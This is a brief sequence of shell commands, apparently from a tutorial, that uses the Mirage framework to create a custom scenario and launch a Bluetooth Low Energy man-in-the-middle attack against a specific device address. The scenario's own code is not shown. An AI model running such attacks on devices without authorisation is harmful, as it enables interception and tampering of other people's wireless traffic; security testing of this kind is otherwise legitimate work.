# Switch to the root user
sudo bash

# Generate the scenario
mirage --create_scenario

# Name the scenario
mitm_attack.py

# Change directory to the scenarios
cd .mirage/scenarios/

# Modify the code in the scenario using an editor
vim mitm_attack.py

# Run the ble_mitm module with the scenario
sudo mirage ble_mitm Target=40:06:A0:8C:9D:DA SCENARIO=mitm_attack
